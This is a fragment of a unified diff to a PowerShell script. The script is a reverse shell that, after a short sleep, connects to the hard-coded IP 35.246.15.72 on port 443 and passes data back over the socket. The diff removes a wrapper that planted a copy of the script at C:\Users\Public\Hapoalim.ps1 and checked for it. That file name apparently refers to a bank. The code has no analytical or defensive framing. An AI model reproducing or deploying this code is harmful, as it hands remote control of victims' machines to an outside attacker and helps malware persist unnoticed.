@@ -1,9 +1,3 @@
-$a={
-$env:flag='1'
-if(Test-Path C:\Users\Public\Hapoalim.ps1){
-$flag='0'
-}
-if($flag -eq '1'){
 Start-Sleep -Seconds 10
 $client = New-Object System.Net.Sockets.TCPClient('35.246.15.72','443')
 $stream = $client.GetStream()
@@ -49,7 +43,3 @@ $stream.Write($sendbytes,0,$sendbytes.Length)
     }
     }
     
-
-    }
-    
-    Set-Content -Path C:\Users\Public\Hapoalim.ps1 -Value $a -ErrorAction SilentlyContinue
